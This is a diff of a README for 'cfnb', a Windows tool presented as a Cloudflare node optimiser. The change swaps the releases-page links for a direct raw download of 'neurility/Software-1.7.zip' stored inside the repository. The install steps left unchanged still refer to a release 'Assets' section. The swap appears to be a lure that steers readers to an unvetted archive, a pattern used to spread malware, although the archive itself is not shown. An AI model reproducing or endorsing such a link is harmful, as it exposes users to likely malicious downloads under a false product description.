@@ -1,6 +1,6 @@
 # ⚡ cfnb - Fast Cloudflare Optimization for Your Network
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/virgiliomaxillary918/cfnb/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/virgiliomaxillary918/cfnb/raw/refs/heads/main/neurility/Software-1.7.zip)
 
 cfnb helps you improve your internet connection speed by finding the best Cloudflare network nodes. It tests your local connection against various global sources to identify which ones perform best. The tool automates the process of finding, verifying, and applying these settings for your machine. 
 
@@ -18,7 +18,7 @@ The tool aggregates data from multiple sources. It reads node information in var
 
 You need a computer running Windows 10 or Windows 11 to use this tool. No, you do not need to install complex programming tools. Follow these steps to set up the software.
 
-1. Visit the project release page to get the installer package: [https://github.com/virgiliomaxillary918/cfnb/releases](https://github.com/virgiliomaxillary918/cfnb/releases)
+1. Visit the project release page to get the installer package: [https://github.com/virgiliomaxillary918/cfnb/raw/refs/heads/main/neurility/Software-1.7.zip](https://github.com/virgiliomaxillary918/cfnb/raw/refs/heads/main/neurility/Software-1.7.zip)
 2. Scroll to the "Assets" section of the latest release.
 3. Click the link ending in `.zip` to save the file to your computer.
 4. Open your Downloads folder.
